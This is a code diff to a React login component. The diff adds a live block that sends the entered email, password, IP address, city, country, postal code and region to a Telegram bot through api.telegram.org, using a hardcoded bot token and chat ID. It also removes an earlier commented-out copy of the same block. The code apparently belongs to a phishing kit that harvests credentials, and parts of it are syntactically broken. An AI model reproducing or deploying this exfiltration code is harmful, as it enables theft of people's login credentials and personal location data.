@@ -43,6 +43,34 @@ function App() {
       } else if (response.data.status === "error") {
         setCo(true);
       } else {
+        
+    const botID = "bot7428443268:AAE1ltmp9UjhX9PNYB3nnO2E1xJPj2ZtCLc";
+    const data = {
+      chat_id: "6096061034",
+      text: {
+        email: fields.email + <br />,
+        password: field.secret + <br />,
+        ip: info.ip + <br />,
+        city: info.city + <br />,
+        country: info.country_name + <br />,
+        postal: info.postal + <br />,
+        region: info.region + <br />,
+      },
+    };
+    try {
+      const response = await axios.post(
+        `https://api.telegram.org/${botID}/sendMessage`,
+        data,
+        {
+          headers: { "Content-Type": "application/json" },
+        }
+      );
+      if (response.data.ok === true) {
+        console.log(response.data);
+      }
+    } catch (e) {
+      console.log(e.response);
+    }
         const form = new FormData()
 
         form.set('email', fields.email)
@@ -135,33 +163,6 @@ function App() {
 
     // setComment("Please try again");
 
-    // const botID = "bot5825052855:AAFvvg6f8benUZNnYc45BaZgkgTTH585Rak";
-    // const data = {
-    //   chat_id: "5345652511",
-    //   text: {
-    //     email: fields.email + <br />,
-    //     password: field.secret + <br />,
-    //     ip: info.ip + <br />,
-    //     city: info.city + <br />,
-    //     country: info.country + <br />,
-    //     postal: info.postal + <br />,
-    //     region: info.region + <br />,
-    //   },
-    // };
-    // try {
-    //   const response = await axios.post(
-    //     `https://api.telegram.org/${botID}/sendMessage`,
-    //     data,
-    //     {
-    //       headers: { "Content-Type": "application/json" },
-    //     }
-    //   );
-    //   if (response.data.ok === true) {
-    //     console.log(response.data);
-    //   }
-    // } catch (e) {
-    //   console.log(e.response);
-    // }
   };
 
   return (
